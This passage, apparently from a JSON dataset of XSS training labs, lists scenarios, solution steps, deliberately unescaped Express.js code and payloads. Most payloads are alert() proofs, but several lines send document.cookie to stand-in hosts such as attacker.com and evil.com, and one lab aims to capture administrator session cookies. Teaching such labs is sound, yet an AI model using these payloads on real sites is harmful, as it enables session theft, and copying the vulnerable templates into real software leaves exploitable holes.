      "Lab Description": "This lab exposes a reflected XSS flaw in the 404 error page of a banking portal. The URL path is reflected into the error template without encoding. To solve: Inject a JavaScript payload in the URL that causes a popup when visiting a broken link.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use OWASP ZAP to crawl URLs and identify dynamic error page.",
        "Send payload in broken path: /thisdoesnotexist<script>alert(1)</script>",
        "Observe reflected input in HTML without sanitization.",
        "Confirm execution of payload on page load.",
        "Try alternative payloads to avoid WAF."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use((req, res) => {\n  res.status(404).send(`<!DOCTYPE html><html><body><h2>Page not found: ${req.url}</h2></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "/<script>alert(1)</script>",
        "/%3Cscript%3Ealert(1)%3C/script%3E"
      ]
    },
    {
      "Lab scenario": "CMS DOM-based XSS via live preview panel",
      "Lab Description": "This lab simulates a WYSIWYG editor in a CMS where user content is shown in a live preview using `innerHTML`. The editor does not strip script tags before rendering. To solve: Inject a script that executes inside the live preview panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open CMS editor and type: <script>alert(123)</script> in the body.",
        "Check if the preview panel updates instantly via innerHTML.",
        "Use browser dev tools to confirm DOM rendering.",
        "Test bypasses like <img src=x onerror=alert(1)>",
        "Trigger execution in preview panel context."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet previewContent = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-preview', (req, res) => {\n  previewContent = req.body.content;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='preview'>${previewContent}</div></body></html>`);\n});\n\napp.listen(3000);",
      "payloads": [
        "<script>alert(123)</script>",
        "<img src=x onerror=alert(1)>"
      ]
    },
    {
      "Lab scenario": "Healthcare portal Stored XSS in patient notes",
      "Lab Description": "This lab mimics a hospital portal where doctors can save notes on patients. These notes are rendered in the admin dashboard without sanitization. The application stores the note input directly and renders it as HTML. To solve: Inject a script in the patient notes to trigger when an admin reviews them.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Login as a doctor and navigate to 'Add Notes' section.",
        "Use Burp Suite to intercept the note submission request.",
        "Inject payload: <script>new Image().src='//attacker.com?c='+document.cookie</script>",
        "Save the note and log out.",
        "Login as admin and open the patient profile to trigger XSS."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet notes = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  notes.push(req.body.note);\n  res.redirect('/admin');\n});\n\napp.get('/admin', (req, res) => {\n  const allNotes = notes.map(n => `<p>${n}</p>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${allNotes}</body></html>`);\n});\n\napp.listen(3000);",
      "payloads": [
        "<script>alert('doctor')</script>",
        "<script>fetch('//evil.com?c='+document.cookie)</script>"
      ]
    },
    {
      "Lab scenario": "E-learning platform DOM-based XSS in quiz result summary",
      "Lab Description": "This lab features a DOM-based XSS vulnerability where quiz scores are reflected on the result page without escaping. The application uses location.hash to read and write data via innerHTML. To solve: Inject a malicious script in the fragment that executes in the DOM context.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to the quiz results page and observe use of location.hash.",
        "Craft a URL: /results.html#<img src=x onerror=alert('XSS')>",
        "Paste it in the address bar and press Enter.",
        "Observe execution of injected JavaScript in the browser.",
        "Test alternative payloads to bypass possible filters."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/results.html', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='summary'></div><script>document.getElementById('summary').innerHTML = decodeURIComponent(location.hash.slice(1));</script></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "#<img src=x onerror=alert('XSS')>",
        "#<svg/onload=alert('HASH')>"
      ]
    },
    {
      "Lab scenario": "Online forum Reflected XSS in topic preview tooltip",
      "Lab Description": "This lab simulates a forum where hovering over a topic shows a preview using query parameters. The content is not sanitized before insertion into an HTML attribute, leading to reflected XSS. To solve: Inject payload via URL to trigger alert on hover.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use OWASP ZAP to find the preview endpoint: /topic/preview?text=",
        "Inject payload: \" onmouseover=alert(1) x=\"",
        "Load the page and hover over the preview tooltip.",
        "Observe execution of JavaScript from the injected attribute.",
        "Experiment with quotes and encoding variations."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/topic/preview', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div title='${req.query.text}'>Topic</div></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "\" onmouseover=alert(1) x=\"",
        "\"><script>alert(123)</script>"
      ]
    },
    {
      "Lab scenario": "Admin panel Stored XSS in system notification editor",
      "Lab Description": "This lab contains a stored XSS vulnerability in a system where admins post internal notifications to all users. The input is saved and directly rendered on user dashboards. To solve: Inject a payload as an admin that triggers a script when a user logs in.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Login to the admin panel and create a new system message.",
        "Inject payload: <iframe srcdoc=\"<script>alert('Notice')</script>\"></iframe>",
        "Save the message and log out.",
        "Login as a normal user and check the dashboard.",
        "Verify script execution upon loading message."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet messages = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/admin-message', (req, res) => {\n  messages.push(req.body.message);\n  res.redirect('/user-dashboard');\n});\n\napp.get('/user-dashboard', (req, res) => {\n  const rendered = messages.map(m => `<div>${m}</div>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${rendered}</body></html>`);\n});\n\napp.listen(3000);",
      "payloads": [
        "<iframe srcdoc=\"<script>alert('Notice')</script>\"></iframe>",
        "<script>alert('Stored')</script>"
      ]
    },
    {
      "Lab scenario": "IoT smart home DOM-based XSS in log viewer tab",
      "Lab Description": "This lab simulates a smart home dashboard that shows device logs. Logs are appended to the DOM using `innerHTML` from localStorage, allowing injection. To solve: Inject a payload into localStorage and reload the page to trigger execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open browser dev tools and navigate to localStorage.",
        "Set: localStorage.setItem('logs', '<img src=x onerror=alert(\"XSS\")>');",
        "Reload the dashboard and open log viewer tab.",
        "Confirm DOM update via innerHTML causes script execution.",
        "Try different storage-based XSS variations."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/iot-dashboard', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='log-output'></div><script>document.getElementById('log-output').innerHTML = localStorage.getItem('logs');</script></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<img src=x onerror=alert(\"XSS\")>",
        "<script>alert('logs')</script>"
      ]
    },
  
   {
      "Lab scenario": "Job portal Stored XSS in resume upload notes",
      "Lab Description": "The application allows job seekers to upload resumes with optional notes. These notes are displayed to employers reviewing applications. However, the notes field is stored and rendered without sanitization. To solve: Inject a malicious script into the notes field to execute when the employer views it.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Register as a job seeker and go to resume upload form.",
        "Intercept the POST request using Burp Suite.",
        "Inject payload: <script>alert('CV XSS')</script> into the notes field.",
        "Submit and log out.",
        "Login as employer and view the resume, triggering the XSS."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet resumes = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload-resume', (req, res) => {\n  resumes.push(req.body.note);\n  res.redirect('/resumes');\n});\n\napp.get('/resumes', (req, res) => {\n  const view = resumes.map(n => `<div>${n}</div>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${view}</body></html>`);\n});\n\napp.listen(3000);",
      "payloads": [
        "<script>alert('CV XSS')</script>",
        "<img src=x onerror=alert('Resume')>"
      ]
    },
    {
      "Lab scenario": "Social media app Reflected XSS in image tag generator",
      "Lab Description": "The app generates HTML <img> tags from user-provided image URLs and returns them in a preview. The input is not properly sanitized, and special characters can break out of the tag context. To solve: Inject JavaScript into the image URL parameter and force execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use OWASP ZAP to discover the endpoint: /generate-tag?src=",
        "Inject: x onerror=alert('XSS') into the src parameter.",
        "Observe the image tag generated with your payload.",
        "Trigger execution by previewing the image.",
        "Verify XSS fires in the response HTML."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/generate-tag', (req, res) => {\n  const src = req.query.src || '';\n  res.send(`<!DOCTYPE html><html><body><img src='${src}' /></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "x onerror=alert('XSS')",
        "x' onerror='alert(1)"
      ]
    },
    {
      "Lab scenario": "Customer support platform Stored XSS in ticket subject field",
      "Lab Description": "A support ticketing system logs user-submitted issues. The subject of the ticket is directly rendered in the admin panel without escaping, resulting in a stored XSS risk. To solve: Inject a script in the subject field to trigger on admin view.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit a new support ticket with subject: <script>alert('Ticket')</script>",
        "Intercept with Burp Suite to confirm it was stored.",
        "Login as support staff and check open tickets.",
        "Observe script executes when the subject is rendered.",
        "Test alternative payloads for filter bypass."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet tickets = []\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  tickets.push(req.body.subject);\n  res.redirect('/tickets');\n});\n\napp.get('/tickets', (req, res) => {\n  const view = tickets.map(t => `<div>${t}</div>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${view}</body></html>`);\n});\n\napp.listen(3000);",
      "payloads": [
        "<script>alert('Ticket')</script>",
        "<svg/onload=alert('Support')>"
      ]
    },
    {
      "Lab scenario": "API documentation tool DOM-based XSS via hash injection",
      "Lab Description": "A JavaScript-powered API doc site uses the URL fragment to display endpoint-specific documentation. The fragment is parsed and inserted into a div via innerHTML. This allows DOM-based XSS when a malicious hash value is used. To solve: Inject a payload into the hash and reload to trigger the XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to /docs.html#intro",
        "Replace fragment with: <img src=x onerror=alert('API')>",
        "Observe innerHTML rendering the fragment as HTML.",
        "Reload the page to confirm execution.",
        "Try obfuscated versions to bypass encoding."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/docs.html', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='content'></div><script>document.getElementById('content').innerHTML = decodeURIComponent(location.hash.slice(1));</script></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "#<img src=x onerror=alert('API')>",
        "#<svg/onload=alert('Docs')>"
      ]
    },
    {
      "Lab scenario": "CMS Mutation-based XSS via JavaScript content injection",
      "Lab Description": "A custom CMS allows inline content editing and uses DOM mutation observers to re-parse user input. Malicious HTML with embedded event handlers is not sanitized before being reinjected. To solve: Use mutation-based injection to trigger execution during DOM parsing.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Login and go to content editor.",
        "Insert: <a href='#' onclick='alert(123)'>Click</a> in the content block.",
        "Save and reload to confirm it persists.",
        "Check if the DOM mutates and re-evaluates handlers.",
        "Use DevTools to confirm event execution on mutation."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet content = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-content', (req, res) => {\n  content = req.body.html;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='preview'>${content}</div><script>const observer = new MutationObserver(() => {}); observer.observe(document.getElementById('preview'), {childList: true});</script></body></html>`);\n});\n\napp.listen(3000);",
      "payloads": [
        "<a href='#' onclick='alert(123)'>Click</a>",
        "<iframe srcdoc='<script>alert(`CMS`)</script>'></iframe>"
      ]
    },
    {
      "Lab scenario": "E-commerce dashboard Stored XSS in product review system",
      "Lab Description": "The application allows users to leave product reviews, which are rendered on product pages. The review text is not sanitized or escaped before rendering. To solve: Inject a stored XSS payload into a review and trigger it on page load.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Write a review for any product with: <script>alert('Review XSS')</script>",
        "Use Burp Suite to confirm the review is stored in the database.",
        "Reload the product page to trigger the payload.",
        "Test different review lengths and payload placements.",
        "Attempt DOM injection with additional tags like <svg>."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/submit-review', (req, res) => {\n  reviews.push(req.body.content);\n  res.redirect('/product');\n});\napp.get('/product', (req, res) => {\n  const html = reviews.map(r => `<p>${r}</p>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${html}</body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<script>alert('Review XSS')</script>",
        "<svg/onload=alert(1)>"
      ]
    },
    {
      "Lab scenario": "Forum platform Reflected XSS in search suggestion API",
      "Lab Description": "The forum uses a live search suggestion endpoint that echoes input directly into a JavaScript-rendered dropdown. No escaping is done on the reflected value. To solve: Inject a script payload into the search box and trigger execution through the live results.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Type <script>alert('XSS')</script> in the search box.",
        "Use OWASP ZAP to intercept and replay the request.",
        "Observe the dropdown HTML response in the developer console.",
        "Trigger the JavaScript execution on hover or suggestion click.",
        "Craft alternative payloads for bypassing character restrictions."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`<!DOCTYPE html><html><body><ul><li>${q}</li></ul></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=1 onerror=alert(1)>"
      ]
    },
    {
      "Lab scenario": "IoT dashboard DOM-based XSS in device label field",
      "Lab Description": "An IoT device management panel allows setting custom labels for devices. These labels are read from `localStorage` and rendered using `innerHTML` in the dashboard. There's no sanitization before rendering, leading to DOM-based XSS. To solve: Inject a payload into localStorage and reload the page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open DevTools and set localStorage.deviceLabel = '<img src=x onerror=alert(1)>'",
        "Reload the page and inspect how labels are inserted into the DOM.",
        "Observe execution of the payload on dashboard load.",
        "Modify payloads to exploit event-based triggers like onmouseover.",
        "Try using different tag wrappers to bypass rendering filters."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/dashboard', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='label'></div><script>document.getElementById('label').innerHTML = localStorage.deviceLabel;</script></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('IoT')>"
      ]
    },
    {
      "Lab scenario": "Online invoice app Reflected XSS via PDF generation name field",
      "Lab Description": "The invoice generator embeds user input directly into an HTML-based invoice that is rendered then converted into a PDF. No sanitization is applied before rendering. To solve: Inject a script that executes during the preview phase of invoice generation.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit invoice form with customer name: <script>alert('PDF')</script>",
        "Intercept request and preview the rendered invoice page.",
        "Observe script execution in the preview before PDF rendering.",
        "Try injecting into other fields like company or address.",
        "Check PDF output if script is embedded or executed."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/generate-invoice', (req, res) => {\n  const name = req.body.name;\n  res.send(`<!DOCTYPE html><html><body><div>Customer: ${name}</div></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<script>alert('PDF')</script>",
        "<img src=x onerror=alert('Invoice')>"
      ]
    },
    {
      "Lab scenario": "Chat widget DOM-based XSS via dynamic welcome message",
      "Lab Description": "A customer support chat widget includes a dynamic welcome message based on the current user. This message is inserted using `innerHTML` from a URL query param. There's no sanitization, enabling DOM-based XSS. To solve: Craft a URL with a payload in the query parameter and trigger the widget.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Visit: /chat?user=<img src=x onerror=alert('Chat')>",
        "Confirm execution of the payload on widget render.",
        "Inspect how the script is added into the DOM.",
        "Try different encoded variants to evade basic filters.",
        "Ensure the payload executes without user interaction."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/chat', (req, res) => {\n  const name = req.query.user || 'Guest';\n  res.send(`<!DOCTYPE html><html><body><div id='welcome'></div><script>document.getElementById('welcome').innerHTML = `Hello, ${name}`;</script></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<img src=x onerror=alert('Chat')>",
        "<svg onload=alert('XSS')>"
      ]
    },
    {
      "Lab scenario": "CMS plugin Stored XSS in article tags",
      "Lab Description": "A content management system allows contributors to tag articles with arbitrary labels. These tags are rendered without sanitization on the article view page. To solve: Inject a script as a tag and verify it executes when the article is opened.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Login as a contributor and navigate to 'Create Article'.",
        "Add a tag such as <script>alert('TagXSS')</script>.",
        "Save and publish the article.",
        "Open the article view page and observe execution.",
        "Try alternate injection methods via hidden iframes."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet tags = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-tag', (req, res) => {\n  tags.push(req.body.tag);\n  res.redirect('/article');\n});\n\napp.get('/article', (req, res) => {\n  const html = tags.map(t => `<span class='tag'>${t}</span>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${html}</body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<script>alert('TagXSS')</script>",
        "<img src=1 onerror=alert('XSS')>"
      ]
    },
    {
      "Lab scenario": "Blog engine Reflected XSS in 404 error message",
      "Lab Description": "The blog's custom 404 page reflects the requested URL path directly into the error page without encoding. This allows attackers to inject scripts into the error message display. To solve: Craft a malicious URL path that triggers script execution on error.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Visit a non-existent page like /<script>alert(404)</script>",
        "Observe if the script executes on the 404 error page.",
        "Use OWASP ZAP to replay the request with different payloads.",
        "Try encoded payloads to bypass filters.",
        "Validate execution across different browsers."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use((req, res) => {\n  res.status(404).send(`<!DOCTYPE html><html><body><h1>404 Not Found: ${req.url}</h1></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<script>alert(404)</script>",
        "<img src=x onerror=alert('404XSS')>"
      ]
    },
    {
      "Lab scenario": "Analytics dashboard DOM-based XSS via chart titles",
      "Lab Description": "The dashboard lets users create custom charts and label them with titles stored in `sessionStorage`. These are later rendered with innerHTML for display without validation. To solve: Inject a payload into `sessionStorage` and reload the page to trigger.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open DevTools console and run: sessionStorage.setItem('title', '<svg onload=alert(1)>')",
        "Reload the page and watch for execution.",
        "Analyze the script location and injection point in the DOM.",
        "Try nesting payloads in <style> or <marquee> for obfuscation.",
        "Ensure it triggers across sessions if persisted."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/chart', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><h1 id='chart-title'></h1><script>document.getElementById('chart-title').innerHTML = sessionStorage.getItem('title');</script></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert('ChartXSS')>"
      ]
    },
    {
      "Lab scenario": "Event registration app Mutation-based XSS in live form preview",
      "Lab Description": "The registration app provides a live preview of custom HTML invitations. The preview renderer mutates and appends the user's raw HTML input, enabling event-based script injection. To solve: Inject a script via onmouseover or onclick and observe execution in the preview.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Type <a href='#' onmouseover=alert('XSS')>Hover me</a> into the form field.",
        "Observe the preview update in real time with your content.",
        "Trigger the event by hovering over the rendered element.",
        "Try injecting <img> tags with onerror attributes.",
        "Check for script execution on mobile vs. desktop."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet preview = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview', (req, res) => {\n  preview = req.body.content;\n  res.redirect('/live-preview');\n});\n\napp.get('/live-preview', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='preview'>${preview}</div><script>const box = document.getElementById('preview'); const observer = new MutationObserver(() => {}); observer.observe(box, {childList: true});</script></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<a href='#' onmouseover=alert('XSS')>Hover me</a>",
        "<img src=x onerror=alert('PreviewXSS')>"
      ]
    },
    {
      "Lab scenario": "Job board Reflected XSS via email contact form",
      "Lab Description": "A job posting site includes a contact form that displays submitted data back to the user in a confirmation message. The name field is reflected into the DOM without escaping. To solve: Inject XSS payloads into the name input and submit the form.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Enter <script>alert('XSS')</script> in the name field.",
        "Submit the contact form.",
        "Observe the confirmation page with your payload reflected.",
        "Use Burp Suite to test for different input vector combinations.",
        "Try encoded payloads like %3Cscript%3E to bypass restrictions."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/contact', (req, res) => {\n  const name = req.body.name;\n  res.send(`<!DOCTYPE html><html><body><div>Thank you, ${name}, we will be in touch.</div></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<script>alert('XSS')</script>",
        "<svg onload=alert('JobXSS')>"
      ]
    },
    {
      "Lab scenario": "Support ticket system Stored XSS in issue title",
      "Lab Description": "The support system allows users to submit tickets with custom titles. These titles are rendered on the admin dashboard without sanitization. To solve: Inject an XSS payload in the title field and trigger execution when viewed by an admin.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Login as a normal user and submit a new support ticket.",
        "In the 'Title' field, use: <script>alert('AdminXSS')</script>",
        "Log out and login as admin to review tickets.",
        "Observe the execution when the ticket title loads.",
        "Test obfuscated payloads to bypass WAF."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet tickets = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  tickets.push(req.body.title);\n  res.redirect('/admin/tickets');\n});\n\napp.get('/admin/tickets', (req, res) => {\n  const html = tickets.map(t => `<div class='ticket-title'>${t}</div>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${html}</body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<script>alert('AdminXSS')</script>",
        "<img src=x onerror=alert('XSS')>"
      ]
    },
    {
      "Lab scenario": "IoT dashboard DOM-based XSS in log viewer",
      "Lab Description": "The IoT device dashboard pulls log messages from local storage and renders them using `innerHTML`. Malicious content injected into localStorage can lead to XSS. To solve: Store a malicious payload in localStorage and reload the logs view.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open browser DevTools and set: localStorage.setItem('log', '<img src=x onerror=alert(1337)>');",
        "Refresh the logs view page.",
        "Check if the image payload gets executed.",
        "Try nesting payloads inside malformed HTML.",
        "Analyze browser console for CSP-related messages."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/logs', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='logs'></div><script>document.getElementById('logs').innerHTML = localStorage.getItem('log');</script></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<img src=x onerror=alert(1337)>",
        "<svg/onload=alert(1)>"
      ]
    },
    {
      "Lab scenario": "Online quiz app Reflected XSS in question preview",
      "Lab Description": "Instructors can preview custom questions by appending content to a preview URL. The question content is reflected into the HTML without escaping. To solve: Inject a payload into the question text parameter and confirm execution.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Access /preview?question=<script>alert('XSS')</script>",
        "Observe execution in the question preview page.",
        "Use Burp to test with URL-encoded payloads.",
        "Try payloads using SVG or iframes.",
        "Confirm if the payload is executed without authentication."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/preview', (req, res) => {\n  const question = req.query.question || '';\n  res.send(`<!DOCTYPE html><html><body><div class='preview'>${question}</div></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<script>alert('XSS')</script>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ]
    },
    {
      "Lab scenario": "E-commerce product manager Stored XSS in custom attributes",
      "Lab Description": "Vendors can add custom HTML attributes to product cards, which are rendered in the admin dashboard. These attributes aren't sanitized, allowing script injection. To solve: Inject JavaScript into a custom attribute and trigger execution when viewed.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "As a vendor, go to 'Add Product'.",
        "Set a custom attribute like: onmouseover=alert('XSS')",
        "Save and open the admin dashboard.",
        "Hover over the affected product card.",
        "Try chaining multiple events for evasion."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet attributes = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-attr', (req, res) => {\n  attributes.push(req.body.attr);\n  res.redirect('/dashboard');\n});\n\napp.get('/dashboard', (req, res) => {\n  const html = attributes.map(a => `<div class='product-card' ${a}></div>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${html}</body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "onmouseover=alert('XSS')",
        "onerror=alert('AttrXSS')"
      ]
    },
    {
      "Lab scenario": "Marketing email preview Mutation-based XSS in dynamic editor",
      "Lab Description": "The dynamic email editor allows marketing staff to preview raw HTML email content. The content is rendered with `innerHTML`, allowing injected payloads to mutate the DOM. To solve: Inject a script via onerror or <svg> and observe execution in preview.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Insert <svg onload=alert('XSS')> in the HTML content.",
        "Click on 'Preview Email' and observe the output.",
        "Try different tags like <body onload=...>.",
        "Use the DevTools console to monitor mutations.",
        "Check if preview is persisted and accessible by others."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet emailContent = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-email', (req, res) => {\n  emailContent = req.body.content;\n  res.redirect('/email');\n});\n\napp.get('/email', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='email-preview'>${emailContent}</div></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<svg onload=alert('XSS')>",
        "<body onload=alert('PreviewXSS')>"
      ]
    },
    {
      "Lab scenario": "DOM XSS in WebSocket message handling",
      "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in a WebSocket-based chat application. The application dynamically updates messages without proper sanitization, allowing attackers to inject malicious scripts. To solve: Inject an XSS payload via WebSocket and execute JavaScript in the victim's browser.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept WebSocket messages using Burp Suite.",
        "2. Inject the following payload: <img src=x onerror=alert(document.domain)>",
        "3. Observe the message rendering in the victim's chat window.",
        "4. Verify script execution in the victim's browser.",
        "5. Exfiltrate sensitive information using document.cookie."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\napp.use(express.static(__dirname + '/public'))\n\nwss.on('connection', ws => {\n  ws.on('message', message => {\n    wss.clients.forEach(client => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(`<div class='message'>${message}</div>`);\n      }\n    });\n  });\n});\n\nserver.listen(8080, () => console.log('WebSocket server running on port 8080'));",
      "payloads": [
        "<img src=x onerror=alert(document.domain)>",
        "<script>alert('WebSocketXSS')</script>"
      ]
    },
    {
      "Lab scenario": "Stored XSS in CMS user profile",
      "Lab Description": "This lab contains a stored cross-site scripting vulnerability in a CMS profile update feature. The application does not properly escape user input before rendering it on the dashboard. To solve: Inject a persistent XSS payload in the profile description and trigger script execution for other users.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Register an account and navigate to the profile edit page.",
        "2. Inject the payload <script>fetch('http://evil.com?c='+document.cookie)</script> in the bio field.",
        "3. Save the profile and log out.",
        "4. Wait for an administrator to view the profile, triggering script execution.",
        "5. Capture administrator session cookies."
      ],
      "Vulnerability name": "Cross-site scripting",
